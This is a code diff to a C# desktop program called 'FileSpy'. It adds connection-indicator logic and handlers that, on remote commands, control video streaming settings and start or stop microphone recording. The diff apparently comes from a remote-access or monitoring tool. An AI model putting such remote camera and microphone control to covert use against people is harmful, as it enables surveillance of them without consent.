@@ -29,6 +29,7 @@ namespace FileSpy
 
         string Version = "[0.1.0.0]";
         string Status = "Simple";
+        bool isRed = true;
 
         public MainWindow()
         {
@@ -99,31 +100,40 @@ namespace FileSpy
 
         private void LostConnection()
         {
-            for (int i = 0; i < 7; i++)
+            if (!isRed)
             {
-                Dispatcher.Invoke(() => GreenColor.Offset += 0.1);
-                Thread.Sleep(50);
-            }
+                for (int i = 0; i < 7; i++)
+                {
+                    Dispatcher.Invoke(() => GreenColor.Offset += 0.1);
+                    Thread.Sleep(50);
+                }
 
-            for (int i = 0; i < 7; i++)
-            {
-                Dispatcher.Invoke(() => RedColor.Offset -= 0.1);
-                Thread.Sleep(50);
+                for (int i = 0; i < 7; i++)
+                {
+                    Dispatcher.Invoke(() => RedColor.Offset -= 0.1);
+                    Thread.Sleep(50);
+                }
+                isRed = true;
             }
         }
 
         private void FindConnection()
         {
-            for (int i = 0; i < 7; i++)
+            if (isRed)
             {
-                Dispatcher.Invoke(() => RedColor.Offset += 0.1);
-                Thread.Sleep(50);
-            }
+                for (int i = 0; i < 7; i++)
+                {
+                    Dispatcher.Invoke(() => RedColor.Offset += 0.1);
+                    Thread.Sleep(50);
+                }
 
-            for (int i = 0; i < 7; i++)
-            {
-                Dispatcher.Invoke(() => GreenColor.Offset -= 0.1);
-                Thread.Sleep(50);
+                for (int i = 0; i < 7; i++)
+                {
+                    Dispatcher.Invoke(() => GreenColor.Offset -= 0.1);
+                    Thread.Sleep(50);
+                }
+
+                isRed = false;
             }
         }
 
@@ -402,14 +412,74 @@ namespace FileSpy
                 {
                     try
                     {
-                        var video = FindVideoWindow(message.ElementID);
-                        video.SetVideoData(message.Package);
+                        FindVideoWindow(message.ElementID).SetVideoData(message.Package);
                     }
                     catch
                     {
                         Connection.SendMessage(new MessageClass(Connection.ID, message.Sender, Commands.VideoClose, message.ElementID));
                     }
                 });
+            }
+
+            if (message.Command == Commands.SetVideo)
+            {
+                try
+                {
+                    if (message.GetStringPackage() == "True")
+                        Dispatcher.Invoke(() => FindVideoClasses(message.ElementID, message.Sender).VideoStream = true);
+                    else
+                        Dispatcher.Invoke(() => FindVideoClasses(message.ElementID, message.Sender).VideoStream = false);
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.SetMaxFps)
+            {
+                try
+                {
+                    Dispatcher.Invoke(() => FindVideoClasses(message.ElementID, message.Sender).MaxFps = Convert.ToInt32(message.GetStringPackage()));
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.SetSize)
+            {
+                try
+                {
+                    Dispatcher.Invoke(() => FindVideoClasses(message.ElementID, message.Sender).Size = Convert.ToInt32(message.GetStringPackage()));
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.SetQuality)
+            {
+                try
+                {
+                    Dispatcher.Invoke(() => FindVideoClasses(message.ElementID, message.Sender).Quality = Convert.ToInt32(message.GetStringPackage()));
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.SetMicro)
+            {
+                try
+                {
+                    if (message.GetStringPackage() == "True")
+                        Dispatcher.Invoke(FindVideoClasses(message.ElementID, message.Sender).MicroInput.StartRecording);
+                    else
+                        Dispatcher.Invoke(FindVideoClasses(message.ElementID, message.Sender).MicroInput.StopRecording);
+                }
+                catch { }
+            }
+
+            if (message.Command == Commands.MicroData)
+            {
+                try
+                {
+                    if (message.Package != null)
+                        Dispatcher.Invoke(() => FindVideoWindow(message.ElementID).MicroBuffer.AddSamples(message.Package, 0 , message.Package.Length));
+                }
+                catch { }
             }
             #endregion
         }
